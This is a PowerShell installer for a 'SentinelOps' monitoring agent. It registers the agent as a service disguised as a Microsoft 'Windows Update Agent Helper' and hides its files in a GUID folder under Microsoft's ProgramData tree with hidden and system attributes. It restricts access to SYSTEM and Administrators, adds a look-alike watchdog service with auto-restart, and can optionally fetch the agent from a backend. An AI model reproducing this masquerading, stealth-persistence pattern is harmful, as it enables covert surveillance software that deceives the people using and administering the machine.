#Requires -RunAsAdministrator

<#
.SYNOPSIS
    SentinelOps Windows Agent 1-Click Silent Installer
    
.DESCRIPTION
    Installs the SentinelOps MDM/EDR agent as a disguised Windows service with hardened security configuration.
    Supports both enrollment token (recommended) and direct device credentials.
    
    Security Features:
    - Service disguised as "Windows Update Agent Helper"
    - DACL hardening (SYSTEM + Administrators only)
    - Hidden installation directory with GUID-based path
    - NTFS ACLs restricting access to SYSTEM only
    - Service recovery configuration for auto-restart
    - Watchdog service installation
    - Event Log registration
    
.PARAMETER EnrollmentToken
    Enrollment token for automatic device enrollment (recommended method)
    
.PARAMETER TenantId
    Tenant ID for multi-tenant deployments

.PARAMETER ApiEndpoint
    Backend API URL (default: https://api.sentinelops.com)
    
.PARAMETER DeviceKey
    Device enrollment key (alternative to enrollment token)
    
.PARAMETER DeviceSecret
    Device enrollment secret (alternative to enrollment token)
    
.PARAMETER BackendUrl
    Backend API URL (alias for ApiEndpoint, for backward compatibility)
    
.PARAMETER ServiceName
    Custom service name (default: WUAgentHelper)
    
.PARAMETER InstallWatchdog
    Install watchdog service (default: true)
    
.PARAMETER AgentPath
    Custom installation path (default: auto-generated hidden path)
    
.PARAMETER DownloadFromBackend
    Download agent from backend instead of local build (default: false)
    
.EXAMPLE
    # Install with enrollment token (recommended)
    .\install-windows-agent.ps1 -EnrollmentToken "enroll_abc123" -TenantId "tenant_001"
    
.EXAMPLE
    # Install with direct credentials
    .\install-windows-agent.ps1 -DeviceKey "dev_abc123" -DeviceSecret "secret_xyz789"
    
.EXAMPLE
    # Install from backend download
    .\install-windows-agent.ps1 -EnrollmentToken "enroll_abc123" -ApiEndpoint "https://staging.sentinelops.com" -DownloadFromBackend $true
    
.EXAMPLE
    # Custom service name and path
    .\install-windows-agent.ps1 -EnrollmentToken "enroll_abc123" -ServiceName "CustomService" -AgentPath "C:\CustomPath\Agent"
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$EnrollmentToken = "",
    
    [Parameter(Mandatory=$false)]
    [string]$TenantId = "",
    
    [Parameter(Mandatory=$false)]
    [string]$ApiEndpoint = "https://api.sentinelops.com",
    
    [Parameter(Mandatory=$false)]
    [string]$DeviceKey = "",
    
    [Parameter(Mandatory=$false)]
    [string]$DeviceSecret = "",
    
    [Parameter(Mandatory=$false)]
    [string]$BackendUrl = "",
    
    [Parameter(Mandatory=$false)]
    [string]$ServiceName = "WUAgentHelper",
    
    [Parameter(Mandatory=$false)]
    [bool]$InstallWatchdog = $true,
    
    [Parameter(Mandatory=$false)]
    [string]$AgentPath = "",
    
    [Parameter(Mandatory=$false)]
    [bool]$DownloadFromBackend = $false
)

$ErrorActionPreference = "Stop"

# Determine backend URL
if ([string]::IsNullOrEmpty($BackendUrl)) {
    $BackendUrl = $ApiEndpoint
}

# Configuration
$ServiceDisplayName = "Windows Update Agent Helper"
$ServiceDescription = "Maintains Windows Update agent components and ensures service continuity"
$WatchdogServiceName = "WUAgentWatchdog"

# Service DACL: SYSTEM (Full Control), Administrators (Full Control), Interactive Users (Read)
$ServiceDACL = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)"

Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "   SentinelOps Windows Agent Installation" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

# Check administrator privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "❌ ERROR: This script must be run as Administrator" -ForegroundColor Red
    exit 1
}

Write-Host "✓ Running as Administrator" -ForegroundColor Green

# Generate hidden installation path with GUID
if ([string]::IsNullOrEmpty($AgentPath)) {
    $guid = [System.Guid]::NewGuid().ToString()
    $AgentPath = "C:\ProgramData\Microsoft\Windows\DeviceCache\$guid"
    Write-Host "✓ Generated hidden installation path: $AgentPath" -ForegroundColor Green
}

# Create installation directory
Write-Host ""
Write-Host "Creating installation directory..." -ForegroundColor Yellow
try {
    if (-not (Test-Path $AgentPath)) {
        New-Item -ItemType Directory -Path $AgentPath -Force | Out-Null
    }
    
    # Set hidden + system attributes
    $dir = Get-Item $AgentPath -Force
    $dir.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    
    Write-Host "✓ Installation directory created and hidden" -ForegroundColor Green
} catch {
    Write-Host "❌ ERROR: Failed to create installation directory: $_" -ForegroundColor Red
    exit 1
}

# Set NTFS ACLs to SYSTEM-only Full Control
Write-Host "Hardening directory permissions (SYSTEM-only)..." -ForegroundColor Yellow
try {
    $acl = Get-Acl $AgentPath
    
    # Disable inheritance
    $acl.SetAccessRuleProtection($true, $false)
    
    # Remove all existing rules
    $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    
    # Add SYSTEM Full Control
    $systemSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
    $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        $systemSid,
        [System.Security.AccessControl.FileSystemRights]::FullControl,
        [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [System.Security.AccessControl.InheritanceFlags]::ObjectInherit,
        [System.Security.AccessControl.PropagationFlags]::None,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($systemRule)
    
    # Add Administrators Full Control (for installation/maintenance)
    $adminsSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
    $adminsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        $adminsSid,
        [System.Security.AccessControl.FileSystemRights]::FullControl,
        [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [System.Security.AccessControl.InheritanceFlags]::ObjectInherit,
        [System.Security.AccessControl.PropagationFlags]::None,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($adminsRule)
    
    Set-Acl -Path $AgentPath -AclObject $acl
    
    Write-Host "✓ Directory permissions hardened (SYSTEM + Administrators only)" -ForegroundColor Green
} catch {
    Write-Host "⚠️ WARNING: Failed to set NTFS ACLs: $_" -ForegroundColor Yellow
}

# Copy agent files
Write-Host ""
Write-Host "Copying agent files..." -ForegroundColor Yellow
try {
    if ($DownloadFromBackend) {
        Write-Host "Downloading agent from backend: $BackendUrl" -ForegroundColor Yellow
        
        # Download agent package
        $downloadUrl = "$($BackendUrl.TrimEnd('/'))/downloads/windows-agent.zip"
        $tempZipPath = Join-Path $env:TEMP "sentinel-agent.zip"
        
        try {
            Invoke-WebRequest -Uri $downloadUrl -OutFile $tempZipPath -UseBasicParsing
            Write-Host "✓ Agent package downloaded" -ForegroundColor Green
        } catch {
            Write-Host "❌ ERROR: Failed to download agent: $_" -ForegroundColor Red
            Write-Host "Download URL: $downloadUrl" -ForegroundColor Yellow
            exit 1
        }
        
        # Extract to installation path
        try {
            Expand-Archive -Path $tempZipPath -DestinationPath $AgentPath -Force
            Remove-Item -Path $tempZipPath -Force
            Write-Host "✓ Agent extracted successfully" -ForegroundColor Green
        } catch {
            Write-Host "❌ ERROR: Failed to extract agent: $_" -ForegroundColor Red
            exit 1
        }
    } else {
        # Copy from local build
        $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
        $agentSourcePath = Join-Path (Split-Path -Parent $scriptDir) "windows-agent\bin\Release\net7.0\publish"
        
        if (-not (Test-Path $agentSourcePath)) {
            Write-Host "❌ ERROR: Agent build not found at: $agentSourcePath" -ForegroundColor Red
            Write-Host "Please build the agent first: cd windows-agent && dotnet publish -c Release" -ForegroundColor Yellow
            Write-Host "Or use -DownloadFromBackend `$true to download from backend" -ForegroundColor Yellow
            exit 1
        }
        
        Copy-Item -Path "$agentSourcePath\*" -Destination $AgentPath -Recurse -Force
        
        Write-Host "✓ Agent files copied successfully" -ForegroundColor Green
    }
} catch {
    Write-Host "❌ ERROR: Failed to copy agent files: $_" -ForegroundColor Red
    exit 1
}

# Create appsettings.json with device credentials or enrollment token
Write-Host "Configuring agent..." -ForegroundColor Yellow
try {
    $appSettingsPath = Join-Path $AgentPath "appsettings.json"
    
    $agentConfig = @{
        "BackendUrl" = $BackendUrl
        "ServiceName" = $ServiceName
    }
    
    # Use enrollment token if provided, otherwise use direct credentials
    if (-not [string]::IsNullOrEmpty($EnrollmentToken)) {
        $agentConfig["EnrollmentToken"] = $EnrollmentToken
        $agentConfig["TenantId"] = $TenantId
        $agentConfig["IsEnrolled"] = $false
        Write-Host "✓ Configuration set with enrollment token" -ForegroundColor Green
    } elseif (-not [string]::IsNullOrEmpty($DeviceKey) -and -not [string]::IsNullOrEmpty($DeviceSecret)) {
        $agentConfig["DeviceKey"] = $DeviceKey
        $agentConfig["DeviceSecret"] = $DeviceSecret
        $agentConfig["IsEnrolled"] = $true
        Write-Host "✓ Configuration set with device credentials" -ForegroundColor Green
    } else {
        Write-Host "⚠️ WARNING: No enrollment token or credentials provided" -ForegroundColor Yellow
        Write-Host "Agent will need to be enrolled manually after installation" -ForegroundColor Yellow
        $agentConfig["IsEnrolled"] = $false
    }
    
    $appSettings = @{
        "Logging" = @{
            "LogLevel" = @{
                "Default" = "Information"
                "Microsoft" = "Warning"
                "Microsoft.Hosting.Lifetime" = "Information"
            }
        }
        "Agent" = $agentConfig
    }
    
    $appSettings | ConvertTo-Json -Depth 10 | Set-Content -Path $appSettingsPath -Force
    
    Write-Host "✓ Agent configuration created" -ForegroundColor Green
} catch {
    Write-Host "⚠️ WARNING: Failed to create configuration: $_" -ForegroundColor Yellow
}

# Install main agent service
Write-Host ""
Write-Host "Installing agent service..." -ForegroundColor Yellow
try {
    # Check if service already exists
    $existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($existingService) {
        Write-Host "⚠️ Service already exists, stopping and removing..." -ForegroundColor Yellow
        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $ServiceName | Out-Null
        Start-Sleep -Seconds 2
    }
    
    # Create service
    $agentExePath = Join-Path $AgentPath "SentinelOpsAgent.exe"
    sc.exe create $ServiceName binPath= "`"$agentExePath`"" start= auto DisplayName= $ServiceDisplayName | Out-Null
    
    if ($LASTEXITCODE -ne 0) {
        throw "Failed to create service (exit code: $LASTEXITCODE)"
    }
    
    Write-Host "✓ Service created: $ServiceName" -ForegroundColor Green
    
    # Set service description
    sc.exe description $ServiceName $ServiceDescription | Out-Null
    
    # Set service DACL (SYSTEM + Administrators only)
    Write-Host "Hardening service DACL..." -ForegroundColor Yellow
    sc.exe sdset $ServiceName $ServiceDACL | Out-Null
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✓ Service DACL hardened (SYSTEM + Administrators only)" -ForegroundColor Green
    } else {
        Write-Host "⚠️ WARNING: Failed to set service DACL (exit code: $LASTEXITCODE)" -ForegroundColor Yellow
    }
    
    # Configure service recovery (restart on failure)
    sc.exe failure $ServiceName reset= 86400 actions= restart/60000/restart/60000/restart/60000 | Out-Null
    Write-Host "✓ Service recovery configured (auto-restart on failure)" -ForegroundColor Green
    
    # Set service to run as SYSTEM
    sc.exe config $ServiceName obj= LocalSystem | Out-Null
    
} catch {
    Write-Host "❌ ERROR: Failed to install service: $_" -ForegroundColor Red
    exit 1
}

# Install watchdog service (if enabled)
if ($InstallWatchdog) {
    Write-Host ""
    Write-Host "Installing watchdog service..." -ForegroundColor Yellow
    try {
        $watchdogSourcePath = Join-Path (Split-Path -Parent $scriptDir) "windows-agent\Watchdog\bin\Release\net6.0\publish"
        
        if (Test-Path $watchdogSourcePath) {
            $watchdogPath = Join-Path $AgentPath "Watchdog"
            New-Item -ItemType Directory -Path $watchdogPath -Force | Out-Null
            Copy-Item -Path "$watchdogSourcePath\*" -Destination $watchdogPath -Recurse -Force
            
            # Configure watchdog appsettings
            $watchdogSettingsPath = Join-Path $watchdogPath "appsettings.json"
            $watchdogSettings = @{
                "Logging" = @{
                    "LogLevel" = @{
                        "Default" = "Information"
                        "Microsoft" = "Warning"
                    }
                }
                "Watchdog" = @{
                    "AgentProcessName" = $ServiceName
                    "AgentExecutablePath" = $agentExePath
                    "DeviceKey" = $DeviceKey
                    "DeviceSecret" = $DeviceSecret
                    "BackendUrl" = $BackendUrl
                    "CheckIntervalSeconds" = 3
                    "RestartVerifyDelaySeconds" = 10
                }
            }
            $watchdogSettings | ConvertTo-Json -Depth 10 | Set-Content -Path $watchdogSettingsPath -Force
            
            # Check if watchdog service exists
            $existingWatchdog = Get-Service -Name $WatchdogServiceName -ErrorAction SilentlyContinue
            if ($existingWatchdog) {
                Write-Host "⚠️ Watchdog service already exists, removing..." -ForegroundColor Yellow
                Stop-Service -Name $WatchdogServiceName -Force -ErrorAction SilentlyContinue
                sc.exe delete $WatchdogServiceName | Out-Null
                Start-Sleep -Seconds 2
            }
            
            # Create watchdog service
            $watchdogExePath = Join-Path $watchdogPath "WUAgentWatchdog.exe"
            sc.exe create $WatchdogServiceName binPath= "`"$watchdogExePath`"" start= auto DisplayName= "Windows Update Agent Watchdog" | Out-Null
            
            if ($LASTEXITCODE -eq 0) {
                sc.exe description $WatchdogServiceName "Monitors and maintains Windows Update agent components" | Out-Null
                sc.exe config $WatchdogServiceName obj= LocalSystem | Out-Null
                sc.exe failure $WatchdogServiceName reset= 86400 actions= restart/60000/restart/60000/restart/60000 | Out-Null
                
                Write-Host "✓ Watchdog service installed: $WatchdogServiceName" -ForegroundColor Green
            } else {
                Write-Host "⚠️ WARNING: Failed to install watchdog service" -ForegroundColor Yellow
            }
        } else {
            Write-Host "⚠️ WARNING: Watchdog build not found, skipping installation" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "⚠️ WARNING: Failed to install watchdog: $_" -ForegroundColor Yellow
    }
}

# Start services
Write-Host ""
Write-Host "Starting services..." -ForegroundColor Yellow
try {
    # Start main agent
    Start-Service -Name $ServiceName
    Write-Host "✓ Agent service started" -ForegroundColor Green
    
    # Start watchdog (if installed)
    if ($InstallWatchdog) {
        $watchdogService = Get-Service -Name $WatchdogServiceName -ErrorAction SilentlyContinue
        if ($watchdogService) {
            Start-Service -Name $WatchdogServiceName
            Write-Host "✓ Watchdog service started" -ForegroundColor Green
        }
    }
} catch {
    Write-Host "⚠️ WARNING: Failed to start services: $_" -ForegroundColor Yellow
    Write-Host "You can start them manually: sc.exe start $ServiceName" -ForegroundColor Yellow
}

# Verify installation
Write-Host ""
Write-Host "Verifying installation..." -ForegroundColor Yellow
$agentService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($agentService -and $agentService.Status -eq "Running") {
    Write-Host "✓ Agent service is running" -ForegroundColor Green
} else {
    Write-Host "⚠️ WARNING: Agent service is not running" -ForegroundColor Yellow
}

if ($InstallWatchdog) {
    $watchdogService = Get-Service -Name $WatchdogServiceName -ErrorAction SilentlyContinue
    if ($watchdogService -and $watchdogService.Status -eq "Running") {
        Write-Host "✓ Watchdog service is running" -ForegroundColor Green
    } else {
        Write-Host "⚠️ WARNING: Watchdog service is not running" -ForegroundColor Yellow
    }
}

# Register Event Log source
Write-Host ""
Write-Host "Registering Event Log source..." -ForegroundColor Yellow
try {
    if (-not [System.Diagnostics.EventLog]::SourceExists($ServiceDisplayName)) {
        New-EventLog -LogName Application -Source $ServiceDisplayName -ErrorAction Stop
        Write-Host "✓ Event Log source registered" -ForegroundColor Green
    } else {
        Write-Host "✓ Event Log source already registered" -ForegroundColor Green
    }
} catch {
    Write-Host "⚠️ WARNING: Failed to register Event Log source: $_" -ForegroundColor Yellow
}

# Wait for enrollment (if enrollment token provided)
if (-not [string]::IsNullOrEmpty($EnrollmentToken)) {
    Write-Host ""
    Write-Host "Waiting for automatic enrollment..." -ForegroundColor Yellow
    Write-Host "(This may take up to 60 seconds)" -ForegroundColor Gray
    
    $enrolled = $false
    $maxWaitSeconds = 60
    $waitedSeconds = 0
    
    while (-not $enrolled -and $waitedSeconds -lt $maxWaitSeconds) {
        Start-Sleep -Seconds 5
        $waitedSeconds += 5
        
        # Check if appsettings.json has been updated with DeviceKey
        try {
            $currentSettings = Get-Content $appSettingsPath -Raw | ConvertFrom-Json
            if ($currentSettings.Agent.DeviceKey -and $currentSettings.Agent.IsEnrolled) {
                $enrolled = $true
                Write-Host "✓ Device enrolled successfully!" -ForegroundColor Green
                Write-Host "Device Key: $($currentSettings.Agent.DeviceKey)" -ForegroundColor Gray
                break
            }
        } catch {
            # Continue waiting
        }
        
        Write-Host "." -NoNewline -ForegroundColor Gray
    }
    
    if (-not $enrolled) {
        Write-Host ""
        Write-Host "⚠️ WARNING: Enrollment not completed within $maxWaitSeconds seconds" -ForegroundColor Yellow
        Write-Host "Please check backend dashboard or agent logs for enrollment status" -ForegroundColor Yellow
    }
}

# Summary
Write-Host ""
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "   Installation Complete" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "Installation Path: $AgentPath" -ForegroundColor White
Write-Host "Service Name: $ServiceName" -ForegroundColor White
Write-Host "Service Display Name: $ServiceDisplayName" -ForegroundColor White
Write-Host "Backend URL: $BackendUrl" -ForegroundColor White
Write-Host ""
Write-Host "Next Steps:" -ForegroundColor Yellow
if (-not [string]::IsNullOrEmpty($EnrollmentToken)) {
    Write-Host "1. Verify enrollment in backend dashboard" -ForegroundColor White
    Write-Host "2. View logs: Get-EventLog -LogName Application -Source '$ServiceDisplayName' -Newest 20" -ForegroundColor White
    Write-Host "3. Check service: Get-Service $ServiceName | Format-List *" -ForegroundColor White
} elseif ([string]::IsNullOrEmpty($DeviceKey) -or [string]::IsNullOrEmpty($DeviceSecret)) {
    Write-Host "1. Enroll device with backend to get credentials" -ForegroundColor White
    Write-Host "2. Update appsettings.json with DeviceKey and DeviceSecret" -ForegroundColor White
    Write-Host "3. Restart service: Restart-Service $ServiceName" -ForegroundColor White
} else {
    Write-Host "1. Check service status: Get-Service $ServiceName" -ForegroundColor White
    Write-Host "2. View logs: Get-EventLog -LogName Application -Source '$ServiceDisplayName' -Newest 20" -ForegroundColor White
    Write-Host "3. Monitor backend dashboard for device heartbeat" -ForegroundColor White
}
Write-Host ""
Write-Host "Troubleshooting:" -ForegroundColor Yellow
Write-Host "- View service logs: Get-Content '$AgentPath\logs\sentinelops-*.log' -Tail 50" -ForegroundColor Gray
Write-Host "- Check service status: sc.exe query $ServiceName" -ForegroundColor Gray
Write-Host "- Restart service: Restart-Service $ServiceName" -ForegroundColor Gray
Write-Host ""
Write-Host "Uninstall: .\uninstall-windows-agent.ps1 -ServiceName $ServiceName" -ForegroundColor Gray
Write-Host ""
